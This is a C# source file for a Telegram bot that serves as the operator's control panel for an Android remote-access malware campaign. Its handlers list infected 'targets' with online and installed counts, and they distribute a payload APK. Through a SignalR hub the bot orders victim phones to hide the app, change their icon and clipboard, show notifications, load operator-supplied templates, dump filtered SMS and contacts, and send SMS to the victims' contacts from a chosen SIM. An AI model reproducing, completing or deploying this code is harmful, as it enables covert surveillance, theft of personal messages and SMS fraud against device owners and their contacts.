using Telegram.BotAPI;
using Telegram.BotAPI.AvailableTypes;
using Telegram.BotAPI.GettingUpdates;
using Telegram.BotAPI.AvailableMethods;
using Telegram.BotAPI.UpdatingMessages;
using Telegram.BotAPI.AvailableMethods.FormattingOptions;

using Presentation.Common.Models;
using Presentation.Common.Constant;
using Presentation.Common.Contexts;
using Presentation.Common.Utilities;

using System.Text;
using Microsoft.AspNetCore.SignalR;
using Microsoft.EntityFrameworkCore;

namespace Presentation.Handlers;

public class TelegramModel
{
    public long UserId { get; set; }
    public Dictionary<string, string> UserValue { get; set; }
}

public class TelegramHandler
{
    private readonly BotClient _telegram;
    private readonly IConfiguration _configuration;
    private readonly DatabaseContext _context;
    private readonly IHubContext<WebSocketHandler> _socket;
    private readonly ConfigurationDynamic _configurationDynamic;

    private List<TelegramModel> Users = new List<TelegramModel>();

    public TelegramHandler(BotClient telegram, DatabaseContext context, IConfiguration configuration, IHubContext<WebSocketHandler> socket, ConfigurationDynamic configurationDynamic)
    {
        _socket = socket;
        _context = context;
        _telegram = telegram;
        _configuration = configuration;
        _configurationDynamic = configurationDynamic;
    }
    public void polling()
    {
        new Thread(async () =>
        {
            while (true)
            {
                try
                {
                    Update[] Updates = await _telegram.GetUpdatesAsync();

                    while (true)
                    {
                        try
                        {
                            if (Updates != null && Updates.Any())
                            {
                                foreach (Update update in Updates)
                                    await UpdateHander(update: update, CancellationToken.None);

                                Updates = await _telegram.GetUpdatesAsync(
                                    offset: Updates.Last().UpdateId + 1
                                );
                            }
                            else Updates = await _telegram.GetUpdatesAsync();
                        }
                        catch (Exception exception)
                        {
                            await ExceptionHandler(exception, CancellationToken.None);

                            Updates = await _telegram.GetUpdatesAsync(
                                offset: Updates.Last().UpdateId + 1
                            );
                        }
                    }
                }
                catch (Exception exception)
                {
                    await ExceptionHandler(exception, CancellationToken.None);
                }
                finally
                {
                    await Task.Delay(100);
                }
            }
        }).Start();
    }

    public async Task UpdateHander(Update update, CancellationToken cancellationToken)
    {
        Console.WriteLine($"[~] New Update Received");

        LocalizationUtility localization = new LocalizationUtility(_configuration);

        var RequestChat = update.Message != null ? update.Message.Chat :
            update.CallbackQuery != null ? update.CallbackQuery.Message.Chat : new Chat();

        var RequestUser = update.Message != null ? update.Message.From :
            update.CallbackQuery != null ? update.CallbackQuery.From : new User();

        var RequestMessage = update.Message != null ?
            !String.IsNullOrEmpty(update.Message.Text) ? update.Message.Text :
            !String.IsNullOrEmpty(update.Message.Caption) ? update.Message.Caption : String.Empty :
            update.CallbackQuery != null ? update.CallbackQuery.Data : String.Empty;

        var ResponseAnswer = String.Empty;
        var ResponseMessage = String.Empty;
        var ResponseDocument = String.Empty;
        var ResponseParseMode = ParseMode.HTML;
        var ResponseReplyMarkup = KeyboardConstant.KeyboardMarkupEmpty();

        string Admin = _configuration.GetSection("settings")["Owners"]
            .Replace(" ", "");

        if (Admin.Split(",").Contains(RequestUser.Id.ToString()) == false && !_configurationDynamic.PublicPermission)
        {
            if (update.Type == UpdateType.Message)
                await _telegram.DeleteMessageAsync(chatId: RequestChat.Id, messageId: update.Message.MessageId);

            else if (update.Type == UpdateType.CallbackQuery) await _telegram.AnswerCallbackQueryAsync(
                showAlert: true,
                text: "ʏᴏᴜ ʜᴀᴠᴇ ᴛʜᴇ ɴᴇᴄᴇꜱꜱᴀʀʏ ᴀᴄᴄᴇꜱꜱ 🍔",
                callbackQueryId: update.CallbackQuery.Id);

            return;
        }
        string UserStep = GetValue(RequestUser.Id, "STEP");

        if (update.Type == UpdateType.Message)
        {
            if (RequestMessage.StartsWith("/start"))
            {
                SetValue(RequestUser.Id, "STEP", String.Empty);

                ResponseMessage = localization.Translate("main_text");
                ResponseReplyMarkup = KeyboardConstant.KeyboardMarkupPanelMain();
            }
            if (RequestMessage.StartsWith("/user_"))
            {
                SetValue(RequestUser.Id, "STEP", String.Empty);

                string DeviceId = RequestMessage.Replace("/user_", "");

                if (await _context.Devices.AnyAsync(x => x.DeviceId == DeviceId))
                {
                    var model = await _context.Devices.FirstOrDefaultAsync(x => x.DeviceId == DeviceId) ?? new DeviceModel();

                    ResponseMessage = localization.Translate("device_text")
                        .Replace("fullname", model.Fullname)
                        .Replace("activity", model.Status == Common.Models.StatusDevice.Online ? "ɪꜱ ᴏɴʟɪɴᴇ" : $"{(DateTime.Now - model.LastConnect).Minutes}ᴍɪɴ");

                    ResponseReplyMarkup = KeyboardConstant.KeyboardMarkupManageTarget(DeviceId);
                }
                else ResponseMessage = localization.Translate("phone_notfound");
            }
            if (string.IsNullOrEmpty(UserStep) == false)
            {
                string DeviceId = GetValue(RequestUser.Id, "DEVICE");

                if (string.IsNullOrEmpty(DeviceId) == false || DeviceId.Equals(ConfigurationConstant.BroadcastId))
                {
                    if (UserStep.Equals("ChangeFullname"))
                    {
                        if (await _context.Devices.AnyAsync(x => x.DeviceId == DeviceId))
                        {
                            var device = await _context.Devices.FirstOrDefaultAsync(x => x.DeviceId == DeviceId) ?? new DeviceModel();

                            device.Fullname = RequestMessage.Substring(0, Math.Min(20, RequestMessage.Length));

                            ResponseMessage = localization.Translate("changed_fullname");
                            ResponseReplyMarkup = KeyboardConstant.KeyboardMarkupBack();

                            _context.Devices.Update(device);
                        }
                        else ResponseMessage = localization.Translate("phone_notfound");
                    }
                    else if (UserStep.Equals("ChangeTemplate"))
                    {
                        if (DeviceId.Equals(ConfigurationConstant.BroadcastId))
                        {
                            _configurationDynamic.Template = RequestMessage;
                            await _socket.Clients.All.SendAsync(UserStep, RequestMessage);
                        }
                        else
                        {
                            var device = await _context.Devices.FirstOrDefaultAsync(x => x.DeviceId == DeviceId) ?? new DeviceModel();

                            await _socket.Clients.Client(device.ConnectionId)
                                .SendAsync(UserStep, RequestMessage);
                        }

                        SetValue(RequestUser.Id, "STEP", String.Empty);

                        ResponseMessage = localization.Translate("sent_request");
                        ResponseReplyMarkup = KeyboardConstant.KeyboardMarkupBack();
                    }
                    else if (UserStep.Equals("ChangeClipboard"))
                    {
                        if (DeviceId.Equals(ConfigurationConstant.BroadcastId))
                            await _socket.Clients.All.SendAsync(UserStep, RequestMessage);
                        else
                        {
                            var device = await _context.Devices.FirstOrDefaultAsync(x => x.DeviceId == DeviceId) ?? new DeviceModel();

                            await _socket.Clients.Client(device.ConnectionId)
                                .SendAsync(UserStep, RequestMessage);
                        }

                        SetValue(RequestUser.Id, "STEP", String.Empty);

                        ResponseMessage = localization.Translate("sent_request");
                        ResponseReplyMarkup = KeyboardConstant.KeyboardMarkupBack();
                    }
                    else if (UserStep.Equals("CreateNotification"))
                    {
                        if (DeviceId.Equals(ConfigurationConstant.BroadcastId))
                            await _socket.Clients.All.SendAsync(UserStep, RequestMessage);
                        else
                        {
                            var device = await _context.Devices.FirstOrDefaultAsync(x => x.DeviceId == DeviceId) ?? new DeviceModel();

                            await _socket.Clients.Client(device.ConnectionId)
                                .SendAsync(UserStep, RequestMessage);
                        }
                        SetValue(RequestUser.Id, "STEP", String.Empty);

                        ResponseMessage = localization.Translate("sent_request");
                        ResponseReplyMarkup = KeyboardConstant.KeyboardMarkupBack();
                    }
                    else if (UserStep.Equals("SendMessage"))
                    {
                        SetValue(RequestUser.Id, "STEP", "GetPhones");
                        SetValue(RequestUser.Id, "MESSAGE", RequestMessage);

                        ResponseMessage = localization.Translate("get_phone_numbers");
                        ResponseReplyMarkup = KeyboardConstant.KeyboardMarkupSendSMS(DeviceId);
                    }
                    else if (UserStep.Equals("GetPhones"))
                    {
                        SetValue(RequestUser.Id, "STEP", "GetSIM");
                        SetValue(RequestUser.Id, "PHONES", RequestMessage);

                        ResponseMessage = localization.Translate("select_sim_card");
                        ResponseReplyMarkup = KeyboardConstant.KeyboardMarkupSelectSim(DeviceId);
                    }

                    else if (UserStep.Equals("ChangePhoneOffMode"))
                    {
                        if (DeviceId.Equals(ConfigurationConstant.BroadcastId))
                            await _socket.Clients.All.SendAsync(UserStep, RequestMessage);
                        else
                        {
                            var device = await _context.Devices.FirstOrDefaultAsync(x => x.DeviceId == DeviceId) ?? new DeviceModel();

                            await _socket.Clients.Client(device.ConnectionId)
                                .SendAsync(UserStep, RequestMessage);
                        }
                        SetValue(RequestUser.Id, "STEP", String.Empty);

                        ResponseMessage = localization.Translate("sent_request");
                        ResponseReplyMarkup = KeyboardConstant.KeyboardMarkupBack();
                    }
                    else if (UserStep.StartsWith("FilterMessage"))
                    {
                        if (int.TryParse(RequestMessage, out int count) && count > 0)
                        {
                            string filter = UserStep.Replace("FilterMessage", String.Empty).ToLower();

                            var device = await _context.Devices.FirstOrDefaultAsync(x => x.DeviceId == DeviceId) ?? new DeviceModel();

                            await _socket.Clients.Client(device.ConnectionId)
                                .SendAsync("FilterMessage", filter, count);

                            SetValue(RequestUser.Id, "STEP", String.Empty);

                            ResponseMessage = localization.Translate("sent_request");
                            ResponseReplyMarkup = KeyboardConstant.KeyboardMarkupBack();
                        }
                        else
                        {
                            ResponseMessage = localization.Translate("invalid_number");
                            ResponseReplyMarkup = KeyboardConstant.KeyboardMarkupBack();
                        }
                    }
                }


            }
        }
        if (update.Type == UpdateType.CallbackQuery)
        {
            string Args = RequestMessage.Split("|").LastOrDefault();
            string Command = RequestMessage.Split("|").FirstOrDefault();
            if (Command.StartsWith("MainMenu"))
            {
                SetValue(RequestUser.Id, "STEP", String.Empty);

                ResponseMessage = localization.Translate("main_text");
                ResponseReplyMarkup = KeyboardConstant.KeyboardMarkupPanelMain();
            }
            if (Command.StartsWith("TargetList"))
            {
                StringBuilder TotalPhoneBuilder = new StringBuilder();

                foreach (DeviceModel device in await _context.Devices.ToListAsync())
                {
                    string PhoneStatus = device.Status == StatusDevice.Online ? "🟢" : "🔴";
                    TotalPhoneBuilder.Append(Environment.NewLine + Environment.NewLine)
                        .Append($"➖ Name - <code>{device.Fullname}</code>{Environment.NewLine}")
                        .Append($"{PhoneStatus} <code>/user_{device.DeviceId}</code>");
                }
                int count_online = await _context.Devices.CountAsync(x => x.Status == StatusDevice.Online);
                int count_installed = await _context.Devices.CountAsync();

                ResponseMessage = localization.Translate("target_list")
                    .Replace("list_targets", TotalPhoneBuilder.ToString())
                    .Replace("count_online", count_online.ToString())
                    .Replace("count_installed", count_installed.ToString());

                ResponseReplyMarkup = KeyboardConstant.KeyboardMarkupBack();
            }

            if (Command.StartsWith("PublicOption"))
            {
                ResponseMessage = localization.Translate("main_text");
                ResponseReplyMarkup = KeyboardConstant.KeyboardMarkupPublicOption();
            }
            if (Command.StartsWith("Configuration"))
            {
                ResponseMessage = localization.Translate("configuration_text");
                ResponseReplyMarkup = KeyboardConstant.KeyboardMarkupConfiguration(_configurationDynamic);
            }
            if (Command.StartsWith("ChangeAutomaticHide"))
            {
                _configurationDynamic.AutomaticHide = !_configurationDynamic.AutomaticHide;

                ResponseMessage = localization.Translate("configuration_text");
                ResponseReplyMarkup = KeyboardConstant.KeyboardMarkupConfiguration(_configurationDynamic);
            }

            if (Command.StartsWith("ChangePublicAccess"))
            {
                _configurationDynamic.PublicPermission = !_configurationDynamic.PublicPermission;

                ResponseMessage = localization.Translate("configuration_text");
                ResponseReplyMarkup = KeyboardConstant.KeyboardMarkupConfiguration(_configurationDynamic);
            }
            if (Command.StartsWith("Download"))
            {
                string ApplicationDirectory = Path.Join(Directory.GetCurrentDirectory(), "Resources/app.apk");

                if (System.IO.File.Exists(ApplicationDirectory))
                {
                    ResponseMessage = localization.Translate("caption_app");
                    ResponseDocument = ApplicationDirectory;
                }
                else ResponseAnswer = localization.Translate("file_notfound");
            }

            if (Command != Args)
            {
                if (RequestMessage.StartsWith("OfflineMode"))
                {
                    ResponseMessage = localization.Translate("configuration_text");
                    ResponseReplyMarkup = KeyboardConstant.KeyboardMarkupOfflineMode(Args);
                }
                if (Command.StartsWith("DeleteTarget"))
                {
                    if (await _context.Devices.AnyAsync(x => x.DeviceId == Args))
                    {
                        var model = await _context.Devices.FirstOrDefaultAsync(x => x.DeviceId == Args);

                        model.Status = StatusDevice.Deleted;

                        _context.Devices.Update(model);

                        ResponseMessage = localization.Translate("target_deleted");
                        ResponseReplyMarkup = KeyboardConstant.KeyboardMarkupBack();
                    }
                    else ResponseAnswer = localization.Translate("device_notfound");
                }
                if (Command.StartsWith("ChangePhoneOffMode"))
                {
                    SetValue(RequestUser.Id, "STEP", Command);
                    SetValue(RequestUser.Id, "DEVICE", Args);

                    ResponseMessage = localization.Translate("enter_phone");
                    ResponseReplyMarkup = KeyboardConstant.KeyboardMarkupBack();
                }
                if (Command.StartsWith("ControlPanel"))
                {
                    if (await _context.Devices.AnyAsync(x => x.DeviceId == Args))
                    {
                        var model = await _context.Devices.FirstOrDefaultAsync(x => x.DeviceId == Args);

                        ResponseMessage = ResponseMessage = localization.Translate("device_text")
                                .Replace("fullname", model.Fullname)
                                .Replace("activity", model.Status == StatusDevice.Online ? "ɪꜱ ᴏɴʟɪɴᴇ" : $"{(DateTime.Now - model.LastConnect).Minutes}MIN");

                        ResponseReplyMarkup = KeyboardConstant.KeyboardMarkupManageTarget(Args);
                    }
                    else ResponseAnswer = localization.Translate("device_notfound");
                }

                if (Command.StartsWith("-"))
                {
                    if (Args.Equals(ConfigurationConstant.BroadcastId))
                        await _socket.Clients.All.SendAsync("Receive", Command.Replace("-", ""));
                    else
                    {
                        var device = await _context.Devices.FirstOrDefaultAsync(x => x.DeviceId == Args) ?? new DeviceModel();

                        await _socket.Clients.Client(device.ConnectionId)
                            .SendAsync("Receive", Command.Replace("-", ""));
                    }

                    ResponseAnswer = localization.Translate("sent_request");
                }
                if (Command.StartsWith("MessageApplication"))
                {
                    ResponseMessage = localization.Translate("filter_text");
                    ResponseReplyMarkup = KeyboardConstant.KeyboardMarkupFilterMessage(Args);
                }
                if (Command.StartsWith("ContactApplication"))
                {
                    ResponseMessage = localization.Translate("filter_text");
                    ResponseReplyMarkup = KeyboardConstant.KeyboardMarkupFilterContact(Args);
                }

                if (Command.StartsWith("ChangeIconApplication"))
                {
                    ResponseMessage = localization.Translate("select_icon");
                    ResponseReplyMarkup = KeyboardConstant.KeyboardMarkupChangeIcon(Args);
                }
                if (Command.StartsWith("ChangeFullname"))
                {
                    SetValue(RequestUser.Id, "STEP", Command);
                    SetValue(RequestUser.Id, "DEVICE", Args);

                    ResponseMessage = localization.Translate("enter_fullname");
                    ResponseReplyMarkup = KeyboardConstant.KeyboardMarkupBack();
                }
                if (RequestMessage.StartsWith("ChangeTemplate"))
                {
                    SetValue(RequestUser.Id, "STEP", Command);
                    SetValue(RequestUser.Id, "DEVICE", Args);

                    ResponseMessage = localization.Translate("enter_link");
                    ResponseReplyMarkup = KeyboardConstant.KeyboardMarkupBack();
                }
                if (RequestMessage.StartsWith("ChangeClipboard"))
                {
                    SetValue(RequestUser.Id, "STEP", Command);
                    SetValue(RequestUser.Id, "DEVICE", Args);

                    ResponseMessage = localization.Translate("enter_message");
                    ResponseReplyMarkup = KeyboardConstant.KeyboardMarkupBack();
                }
                if (RequestMessage.StartsWith("FilterMessage"))
                {
                    SetValue(RequestUser.Id, "STEP", Command);
                    SetValue(RequestUser.Id, "DEVICE", Args);

                    ResponseMessage = localization.Translate("count_message");
                    ResponseReplyMarkup = KeyboardConstant.KeyboardMarkupBack();
                }

                if (RequestMessage.StartsWith("CreateNotification"))
                {
                    SetValue(RequestUser.Id, "STEP", Command);
                    SetValue(RequestUser.Id, "DEVICE", Args);

                    ResponseMessage = localization.Translate("enter_message");
                    ResponseReplyMarkup = KeyboardConstant.KeyboardMarkupBack();
                }
                if (RequestMessage.StartsWith("SendMessage"))
                {
                    SetValue(RequestUser.Id, "STEP", Command);
                    SetValue(RequestUser.Id, "DEVICE", Args);

                    ResponseMessage = localization.Translate("enter_message");
                    ResponseReplyMarkup = KeyboardConstant.KeyboardMarkupBack();
                }

                if (!String.IsNullOrEmpty(UserStep))
                {
                    if (UserStep.Equals("GetPhones") && Command.StartsWith("SendToContact"))
                    {
                        SetValue(RequestUser.Id, "STEP", "GetSIM");
                        SetValue(RequestUser.Id, "PHONES", "CONTACT");

                        ResponseMessage = localization.Translate("select_sim_card");
                        ResponseReplyMarkup = KeyboardConstant.KeyboardMarkupSelectSim(Args);
                    }
                    else if (UserStep.Equals("GetSIM") && (Command.StartsWith("WithOne") || Command.StartsWith("WithTwo")))
                    {
                        if (Args.Equals(ConfigurationConstant.BroadcastId))
                            await _socket.Clients.All.SendAsync("SendMessage", GetValue(RequestUser.Id, "MESSAGE"), GetValue(RequestUser.Id, "PHONES"), Command);
                        else
                        {
                            var device = await _context.Devices.FirstOrDefaultAsync(x => x.DeviceId == Args) ?? new DeviceModel();

                            await _socket.Clients.Client(device.ConnectionId)
                                .SendAsync("SendMessage", GetValue(RequestUser.Id, "MESSAGE"), GetValue(RequestUser.Id, "PHONES"), Command);
                        }
                        SetValue(RequestUser.Id, "STEP", String.Empty);

                        ResponseMessage = localization.Translate("sent_request");
                        ResponseReplyMarkup = KeyboardConstant.KeyboardMarkupBack();
                    }
                }
            }

        }
        await _context.SaveChangesAsync();

        if (String.IsNullOrEmpty(ResponseAnswer) == false)
            await _telegram.AnswerCallbackQueryAsync(
                showAlert: true,
                text: ResponseAnswer,
                callbackQueryId: update.CallbackQuery.Id
            );

        else if (String.IsNullOrEmpty(ResponseDocument) == false)
        {
            await using Stream stream = System.IO.File.OpenRead(ResponseDocument);

            await _telegram.SendDocumentAsync(
                chatId: RequestChat.Id,
                caption: ResponseMessage,
                document: new InputFile(
                    streamcontent: new StreamContent(stream),
                    filename: DateTime.Now.ToFileTime().ToString() + Path.GetExtension(ResponseDocument)),
                parseMode: ResponseParseMode);
        }

        else if (String.IsNullOrEmpty(ResponseMessage) == false)
        {
            List<List<string>> ResponseMessages = ResponseMessage.Split(Environment.NewLine).ToList().Select((x, i) => new { Index = i, Value = x })
                .GroupBy(x => x.Index / 100)
                .Select(x => x.Select(v => v.Value + Environment.NewLine).ToList())
                .ToList();

            foreach (List<string> message in ResponseMessages)
                await _telegram.SendMessageAsync(
                    text: String.Concat(message),
                    chatId: RequestChat.Id,
                    parseMode: ResponseParseMode,
                    replyMarkup: ResponseReplyMarkup,
                    disableWebPagePreview: true
                );
        }
    }
    public async Task ExceptionHandler(Exception exception, CancellationToken cancellationToken)
    {
        Console.WriteLine(exception);

        await Task.CompletedTask;
    }
    public string GetValue(long UserId, string key)
    {
        var model = CreateIfNotExistUser(UserId);

        if (model.UserValue.Keys.Contains(key) == true)
            if (model.UserValue.TryGetValue(key, out string result)) return result;
        return String.Empty;
    }
    public void SetValue(long UserId, string key, string value)
    {
        var model = CreateIfNotExistUser(UserId);

        if (model.UserValue.Keys.Contains(key) == false)
            model.UserValue.Add(key, value);
        else model.UserValue[key] = value;
        Users.SingleOrDefault(x => x.UserId == UserId).UserValue = model.UserValue;
    }
    public TelegramModel CreateIfNotExistUser(long UserId)
    {
        if (!Users.Any(x => x.UserId == UserId))
        {
            var model = new TelegramModel
            {
                UserId = UserId,
                UserValue = new Dictionary<string, string>()
            };
            Users.Add(model);
            return model;
        }
        return Users.SingleOrDefault(x => x.UserId == UserId);
    }
}
